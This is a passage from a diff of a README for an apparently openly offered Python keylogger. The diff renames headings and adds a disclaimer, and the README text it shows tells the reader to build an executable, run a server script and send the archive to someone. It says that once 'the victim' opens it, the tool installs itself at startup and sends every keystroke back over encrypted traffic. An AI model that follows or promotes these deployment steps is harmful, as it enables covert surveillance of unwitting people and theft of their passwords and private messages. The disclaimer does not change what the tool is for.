@@ -28,13 +28,15 @@ Once you've built the .exe, create a new zip archive and copy this files into it
 After that, run ``server.py``, send the archive to someone  
 And after the victim opens your .exe, the keylogger will be installed in the startup and will transmit all keystrokes to you.
 
-# Functional
+## Functional
 - All inputs are saving to log.txt
 - Autostart
 - Traffic Encryption
 
-# Requirements
+## Requirements
 - Python
 - pynput
 - pyyaml
 - colorama
+
+> ⚠️The author is not responsible for any illegal use of this code
